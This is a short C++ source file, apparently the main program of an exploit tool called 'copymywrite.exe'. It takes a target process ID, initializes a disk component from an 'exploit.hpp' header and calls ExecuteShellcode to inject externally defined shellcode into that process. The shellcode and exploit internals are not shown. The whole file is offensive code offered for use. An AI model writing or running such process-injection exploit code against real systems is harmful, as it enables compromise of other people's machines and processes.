#include "exploit.hpp"
#include <chrono>
#include <thread>
extern "C" void Shellcode();
extern "C" void EndOfShellcode();

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		Log("Usage: copymywrite.exe targetprocesspid");
		return 1;
	}
	if (!disk::Initialize())
	{
		Log("Failed to initialize disk");
		return 1;
	}

	UINT32 targetPid = atoi(argv[1]);
          if (targetPid <= 4) { // system PIDs are unsafe
                Log("Invalid or unsafe target PID");
                  return 1;
             }
	ExecuteShellcode(targetPid, (UINT64)&Shellcode, (UINT64)&EndOfShellcode, +[](UINT32 pid) {
		system("pause");
	});
		


	return 0;
}
